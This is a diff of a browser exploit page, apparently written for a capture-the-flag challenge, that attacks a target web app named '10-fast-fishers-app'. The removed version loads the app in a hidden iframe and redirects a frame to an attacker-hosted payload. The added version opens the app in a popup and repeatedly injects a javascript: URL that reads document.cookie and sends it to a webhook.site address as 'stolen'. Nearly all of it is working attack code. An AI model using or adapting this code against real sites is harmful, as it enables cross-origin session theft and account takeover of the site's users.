@@ -6,29 +6,19 @@
 console.log("PWN-START");
 
 // Strategy:
-// 1) Use a hidden iframe we control in OUR page.
-// 2) Load the target app into that iframe.
-// 3) Navigate the iframe itself to a javascript: URL and inspect the execution
-//    context. If it runs inside the target app origin, forge FISH_CLICKED from
-//    there and let the app inject our HTML into the parent document.
+// Open the target app in a popup, wait for it to finish navigating, then
+// repeatedly force a javascript: URL into that popup. If Firefox executes the
+// URL in the popup origin, document.cookie should become readable there.
 
 const target = "http://10-fast-fishers-app:5000/";
-const iframe = document.createElement("iframe");
-iframe.style.display = "none";
-iframe.src = target;
-document.body.appendChild(iframe);
-console.log("IFRAME-APPENDED-" + target);
+const w = window.open(target, "_blank");
+console.log("POPUP-OPENED-" + target);
 
 const js = "javascript:(function(){" +
   "try{" +
-    "console.log('CTX-ORIGIN:'+location.origin);" +
-    "console.log('CTX-HREF:'+location.href);" +
-    "const frame=document.getElementById('aquariumFrame');" +
-    "console.log('CTX-FRAME:'+(!!frame));" +
-    "if(frame&&frame.contentWindow){" +
-      "frame.contentWindow.location='https://egraomire2.github.io/CTF-attacker-serv/frame_payload.html';" +
-      "console.log('AQUARIUM-REDIRECTED');" +
-    "}" +
+    "const c=document.cookie;" +
+    "console.log('COOKIE-VALUE:'+c);" +
+    "if(c&&c.length>0){fetch('https://webhook.site/b626f651-8da4-4515-ba3a-e24ba1f1d3ad?stolen='+encodeURIComponent(c)).catch(()=>{});} " +
   "}catch(e){console.log('CTX-ERR:'+e.message);} " +
 "})()";
 
@@ -37,18 +27,18 @@ setTimeout(() => {
   const leakLoop = setInterval(() => {
     tries++;
     try {
-      iframe.src = js;
-      console.log("CTX-ATTEMPT-" + tries);
+      w.location = js;
+      console.log("ATTEMPT-" + tries);
     } catch (e) {
-      console.log("CTX-ERR-" + tries + ":" + e.message);
+      console.log("ATTEMPT-ERR-" + tries + ":" + e.message);
     }
 
     if (tries >= 20) {
       clearInterval(leakLoop);
       console.log("PWN-DONE");
     }
-  }, 180);
-}, 900);
+  }, 60);
+}, 3200);
 
 </script>
 </body>
